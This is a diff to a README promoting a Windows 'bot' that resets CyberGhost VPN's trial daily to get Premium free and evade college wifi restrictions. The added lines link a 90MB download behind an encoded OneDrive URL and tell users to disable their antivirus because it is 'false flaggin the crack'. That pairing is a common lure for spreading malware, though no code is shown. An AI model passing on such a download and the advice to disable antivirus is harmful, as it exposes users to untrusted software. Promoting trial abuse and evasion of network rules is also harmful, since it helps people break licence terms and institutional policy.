@@ -2,11 +2,17 @@
 
 This bot automates EVERYTHING to get you CyberGhost VPN Premium for free, resetting the 1-day trial every single day. **Unlimited. No setup, no effort.**  
 
-**Only works on Windows 😞 and iOS devices** (but you have to use this bot on a Windows PC and log in with the generated Premium VPN account).
+Only works on Windows :(
 
 ![Screenshot1](https://github.com/sillyLazyCat/fuckVITBPL/blob/main/Screenshot1.png?raw=true)
----
 
+---
+### Download (90MB): 
+[![Download Button](https://github.com/sillyLazyCat/fuckVITBPL/blob/main/button_fuckvitbpl.png?raw=true)](https://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBbmFBb3FKY3VoYlZjb1pabV81ODNnWVNfcTQ_ZT1HMmZlNng/root/content)
+
+**Kill the antivirus for a sec**—it’s false flaggin the crack.
+
+---
 ## Why this exists:
 VITBPL wifi is actual trash, bro. It shoulda been dead or sum, speeds so slow, your WhatsApp texts show up next semester 😭🙏, and disconnects every 2 minutes like it’s powered by hopes and prayers 💯.  
 So, I made this bot to get rid of their shit restrictions and give you usable internet forever.
@@ -57,9 +63,12 @@ However, the EA App doesn’t work with VPN, so here’s your fix: [Fuck_off_EA_
 **Q: What if the VPN stops?**  
 **A:** Just run the bot again, reset everything, and you’re good to go.
 
+**Q: Why isn’t this working on Windows 10?**  
+**A:** It’s a buggy mess on some Windows 10 machines, especially if you’re on updates from 2021 or earlier.
+
 ---
 
-### Big thanks to “MADARA” for building the reset tool! 🙏❤️  
+### Big thanks to “MADARA” for building the reset tool! ❤️  
 **Made using AI because college taught me nothing LMFAO.**  
 If this bot saved your broke ass, share it with your homies and don’t gatekeep like VIT wifi admins xd.  
 
